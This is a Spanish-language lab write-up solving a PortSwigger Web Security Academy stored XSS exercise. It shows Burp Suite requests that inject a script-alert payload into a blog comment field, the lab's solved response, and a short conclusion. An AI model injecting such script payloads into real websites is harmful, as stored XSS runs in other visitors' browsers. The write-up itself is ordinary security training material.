# 🤯 EXPLOTACION



*   BURP SUITE --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)

    ```python
    REQUEST:


    POST /post/comment HTTP/1.1
    Host: 0a9f006203c52313803221f800f20052.web-security-academy.net
    Cookie: session=gVRGbyObaBk8uOuMZCOyN6GCDLL89rnM
    Content-Length: 171
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Linux"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
    Origin: https://0a9f006203c52313803221f800f20052.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a9f006203c52313803221f800f20052.web-security-academy.net/post?postId=1
    Accept-Encoding: gzip, deflate, br
    Accept-Language: es-419,es;q=0.9,en;q=0.8
    Connection: close

    csrf=5aGK2T2ryPOp8qacwVPwWi9aaiShRntn&postId=1&comment=<script>alert('XSS_por_P4IM0N')</script>&name=PAIMON&email=P4IM0N%40hotmail.com&website=https%3A%2F%2Fp4imon-d-m-python.herokuapp.com%2F




    GET /post/comment/confirmation?postId=1 HTTP/2
    Host: 0a9f006203c52313803221f800f20052.web-security-academy.net
    Cookie: session=gVRGbyObaBk8uOuMZCOyN6GCDLL89rnM
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Linux"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
    Origin: https://0a9f006203c52313803221f800f20052.web-security-academy.net
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a9f006203c52313803221f800f20052.web-security-academy.net/post/comment
    Accept-Encoding: gzip, deflate, br
    Accept-Language: es-419,es;q=0.9,en;q=0.8




    RESPONSE:


    HTTP/2 200 OK
    Content-Type: text/html; charset=utf-8
    X-Frame-Options: SAMEORIGIN
    Content-Length: 5880

    <!DOCTYPE html>
    <html>
        <head>
            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
            <link href=/resources/css/labsBlog.css rel=stylesheet>
            <title>Stored XSS into HTML context with nothing encoded</title>
        </head>
        <body>
            <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
                <section class='academyLabBanner is-solved'>
                    <div class=container>
                        <div class=logo></div>
                            <div class=title-container>
                                <h2>Stored XSS into HTML context with nothing encoded
                                 class=notification-labsolved-hidden>
                    <div class=container>
                        <h4>Congratulations, you solved the lab!</h4>
                        <div>
                            <span>
                                Share your skills!
                            </span>
                            <a class=button href='
                                               <header class="notification-header">
                        </header>
                        <h1>Thank you for your comment!</h1>
                        <p>Your comment has been submitted.</p>
                        <div class="is-linkback">
                            <a href="/post?postId=1">Back to blog</a>
                        </div>
                    </div>
                </section>
                <div class="footer-wrapper">
                </div>
            </div>
        </body>
    </html>
    ```

    * CONCLUSION: INTENTAMOS INYECTAR LA CARGA UTIL (\<script>alert('XSS\_por\_P4IM0N')\</script>) y LOGRAMOS EL XSS ALMACENADO, SE TENZO RESOLVIMOS EL LABORATORIO.
